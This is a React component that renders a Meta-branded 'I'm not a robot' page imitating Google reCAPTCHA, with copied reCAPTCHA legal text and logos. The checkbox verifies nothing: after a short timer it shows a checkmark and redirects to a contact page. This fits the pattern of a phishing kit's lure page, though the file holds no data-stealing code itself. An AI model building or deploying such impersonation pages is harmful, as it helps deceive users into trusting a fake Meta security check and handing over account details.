import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "./Live.scss";

// you can replace these with real images placed in public/ or src/assets
const META_IMAGE = "/meta-image.png";
const RECAPTCHA_IMAGE = "/recaptcha.png";

export default function Live() {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [showCheck, setShowCheck] = useState(false);

  const handleVerify = () => {
    setIsLoading(true);
    // simulate the POST /api/verify behaviour from the other project
    setTimeout(() => {
      setShowCheck(true);
      setIsLoading(false);
    }, 2000);
  };

  useEffect(() => {
    if (showCheck) {
      const redirectTimeout = setTimeout(() => {
        // after the checkmark appears we redirect to the contact page with timestamp
        const currentTime = Date.now();
        navigate(`/contact/${currentTime}`);
      }, 500);
      return () => clearTimeout(redirectTimeout);
    }
  }, [showCheck, navigate]);

  return (
    <div className="live-container">
      <div className="live-box">
        <img src={META_IMAGE} alt="Meta" className="live-meta" />
        <div className="checkbox-row">
          <div className="checkbox-wrapper">
            <button className="checkbox-button" onClick={handleVerify}>
              <input type="checkbox" className="hidden-checkbox" />
              {isLoading && <div className="spinner" />}
              {!isLoading && showCheck && <div className="checkmark">✓</div>}
            </button>
            <span className="checkbox-label">I'm not a robot</span>
          </div>
          <div className="recaptcha-block">
            <img src={RECAPTCHA_IMAGE} alt="reCAPTCHA" className="recaptcha-img" />
            <p className="recaptcha-text">reCAPTCHA</p>
            <small className="recaptcha-small">Privacy - Terms</small>
          </div>
        </div>
        <div className="live-text">
          <p>
            This helps us to combat harmful conduct, detect and prevent spam and
            maintain the integrity of our Products.
          </p>
          <p>
            We’ve used Google's reCAPTCHA Enterprise product to provide this
            security check. Your use of reCAPTCHA Enterprise is subject to
            Google’s Privacy Policy and Terms of Use.
          </p>
          <p>
            reCAPTCHA Enterprise collects hardware and software information,
            such as device and application data, and sends it to Google to
            provide, maintain, and improve reCAPTCHA Enterprise and for general
            security purposes. This information is not used by Google for
            personalized advertising.
          </p>
        </div>
      </div>
    </div>
  );
}
